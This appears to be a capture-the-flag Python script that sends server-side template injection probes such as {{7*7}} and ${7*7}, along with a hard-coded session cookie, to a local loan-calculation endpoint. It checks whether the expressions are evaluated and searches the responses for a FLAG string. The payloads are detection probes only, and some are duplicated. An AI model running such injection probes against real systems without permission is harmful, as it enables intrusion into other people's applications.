import requests
import json
import re

# Target endpoint and session
target_url = "http://127.0.0.1:32790/total_loan_payments"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVlwig.WglbQAOjrshMUOF4GPSXbG8Pe90"

# Define the 8 SSTI bypass techniques
techniques = [
    ("SSTI 101", "{{7*7}}"),
    ("SSTI 102", "${7*7}"),
    ("SSTI 103", "<%=%>"),
    ("SSTI 104", "#{7*7}"),
    ("SSTI 105", "{{7*7}}"),
    ("SSTI 106", "${{7*7}}"),
    ("SSTI 107", "{{7 * 7}}"),
    ("SSTI 108", "[[7*7]]")
]

# Headers
headers = {
    "Content-Type": "application/json",
    "Cookie": f"session={session_cookie}"
}

print("=" * 80)
print("SSTI BYPASS TECHNIQUE TESTING")
print("=" * 80)
print(f"Target: {target_url}")
print(f"Session: {session_cookie[:40]}...")
print(f"Testing {len(techniques)} bypass techniques\n")

results = []

# Test each technique
for test_name, payload, in techniques:
    print(f"\n[TEST] {test_name}: {payload}")
    print("-" * 80)
    
    # Create test data
    test_data = {
        "amount": payload,
        "user_input": "test_value"
    }
    
    try:
        # Send POST request with JSON payload
        response = requests.post(
            target_url,
            headers=headers,
            json=test_data,
            timeout=15
        )
        
        # Extract response details
        status_code = response.status_code
        response_text = response.text
        content_length = len(response.content)
        
        print(f"[STATUS] {status_code}")
        print(f"[LENGTH] {content_length} bytes")
        print(f"[HEADERS] {dict(response.headers)}")
        
        # Check for filter indicators
        forbidden_words = ["forbidden", "blocked", "access denied", "unauthorized", "invalid", "error"]
        filter_blocked = any(word.lower() in response_text.lower() for word in forbidden_words)
        
        if filter_blocked:
            matches = [word for word in forbidden_words if word.lower() in response_text.lower()]
            print(f"[FILTER] ✗ BLOCKED - Detected: {matches}")
        else:
            print(f"[FILTER] ✓ No filter indicators")
        
        # Check if 7*7 rendered to 49
        rendered = "49" in response_text
        exact_match = re.search(r'\b49\b', response_text)
        
        if exact_match:
            print(f"[TEMPLATE] ✓ EXECUTED - Found '49' at position {exact_match.start()}")
            print(f"  Context: ...{response_text[max(0, exact_match.start()-20):exact_match.start()+20]}...")
        else:
            print(f"[TEMPLATE] ✗ Not executed")
        
        # Check JSON validity
        try:
            json_response = response.json()
            print(f"[JSON] ✓ Valid JSON")
            print(f"  Parse Result: {json_response}")
        except json.JSONDecodeError:
            print(f"[JSON] ✗ Invalid JSON")
            print(f"  Response is plain text/html")
        
        # Full response preview
        print(f"\n[RESPONSE]\n{response_text[:500]}...")
        
        # Store results
        results.append({
            "technique": test_name,
            "payload": payload,
            "status": status_code,
            "filter_blocked": filter_blocked,
            "template_executed": rendered,
            "json_valid": "application/json" in response.headers.get('Content-Type', ''),
            "full_response": response_text
        })
        
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        results.append({
            "technique": test_name,
            "payload": payload,
            "error": str(e)
        })

# Summary
print("\n" + "=" * 80)
print("SUMMARY")
print("=" * 80)
print(f"\n{'Technique':<12} {'Status':<6} {'Filter':<8} {'Template':<10} {'JSON':<5}")
print("-" * 80)

bypasses = []
for result in results:
    technique = result["technique"]
    status = result.get("status", "ERR")
    filter_blocked = result.get("filter_blocked", False)
    template_executed = result.get("template_executed", False)
    json_valid = result.get("json_valid", False)
    
    filter_status = "BLOCKED" if filter_blocked else "PASS"
    template_status = "EXECUTED" if template_executed else "NO"
    json_status = "YES" if json_valid else "NO"
    
    print(f"{technique:<12} {status:<6} {filter_status:<8} {template_status:<10} {json_status:<5}")
    
    if not filter_blocked and template_executed:
        bypasses.append(result)

print("\n" + "=" * 80)
print("ANALYSIS")
print("=" * 80)

if bypasses:
    print(f"\n[✓] SUCCESS - {len(bypasses)} technique(s) bypass filter:")
    for bypass in bypasses:
        print(f"  - {bypass['technique']}: {bypass['payload']}")
        print(f"    Status: {bypass['status']}, Template executed: {7*7}")
else:
    print(f"\n[✗] FAILURE - No techniques bypassed the filter")
    print(f"Next step: Try additional encoding/obsfuscation techniques")

# Check for flags
print("\n" + "=" * 80)
print("FLAG SEARCH")
print("=" * 80)

for result in results:
    response_text = result.get("full_response", "")
    flag_match = re.search(r'FLAG\{[^}]+\}', response_text)
    if flag_match:
        print(f"\n[!] FLAG FOUND with {result['technique']}")
        print(f"    Flag: {flag_match.group(0)}")
        print(f"    Context: {response_text[max(0, flag_match.start()-50):flag_match.end()+50]}")
        
flag_found = any("FLAG{" in r.get("full_response", "") for r in results)
if not flag_found:
    print("\n[-] No FLAG pattern found in responses")
